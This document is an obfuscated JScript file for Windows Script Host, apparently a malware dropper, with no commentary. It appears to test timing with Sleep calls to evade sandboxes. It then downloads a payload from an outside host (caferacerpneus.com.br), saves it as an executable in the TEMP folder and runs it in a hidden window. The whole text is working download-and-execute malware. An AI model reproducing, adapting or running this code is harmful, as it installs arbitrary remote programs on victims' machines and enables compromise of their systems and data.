var fM = false;
var SN = "CreateObject";
var S = function jZ() {return WScript[SN]("WScript.Shell");}(), em = 11;
var XE = "MSXML2.XMLHTTP";
var JE = 2123213;
var ui = 0;
function jv(w){S["Run"](w, ui, ui);};
function y(){return "" + XE;};
function Qe(If, Xj){ui = ui * 1; return If - Xj;};
function cz(){return SN;};
/*@cc_on
  @if (@_win32 || @_win64)
    fM = true;
  @end
@*/
if (fM)
{
var Mr = "";
function m(){return 22;};
var rL = 0; var Tg = 0;
function L()
{
var bw = new this["Date"]();
var fu = bw["getUTCMilliseconds"]();
WScript["Sleep"](m());
var bw = new this["Date"]();
var fb = bw["getUTCMilliseconds"]();
WScript["Sleep"](m());
var bw = new this["Date"]();
var W = bw["getUTCMilliseconds"]();
var rL = "e";
rL = Qe(fb, fu);
var Tg = "s";
Tg = Qe(W, fb);
Mr = "open";
return Qe(rL, Tg);
}
var E = false;
var F = false;
for (var BZ = ui; BZ < m() * 1; BZ++){if (L() != ui){
E = true; 
Tg = "31" + 11 * rL + Tg; 
F = true; 
break;
}}
function nC() {return ((E == true) && (E == F)) ? 1 : ui;};
if (E && nC() && F){
function J() {return S["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "wd0ntWPi9vknL.exe";};
 MD = y();
 WU = WScript[SN](MD);
 var t = 1;
 while (t){
try {
WU[Mr]("GET", "http://caferacerpneus.com.br/lw2osd", false);
WU["send"]();
IF = "Sleep";
for (;;){WScript[IF](m() * 11); if (WU["readystate"] >= 2 * 2) break;};
t = ui;
} catch(J0){};
}
function l(O) {var i = (1, 2, 3, 4, 5, O); return i;};
ma = WScript[cz()]("ADODB.Stream");
MD = ma;
MD[Mr]();
MD["type"] = l(1);
MD["write"](WU["ResponseBody"]);
ma["position"] = l(ui);
MD["Save" + "ToFile"](J(), 2);
ma["c"+"lose"]();
lG = J();
jv(lG);
}
}

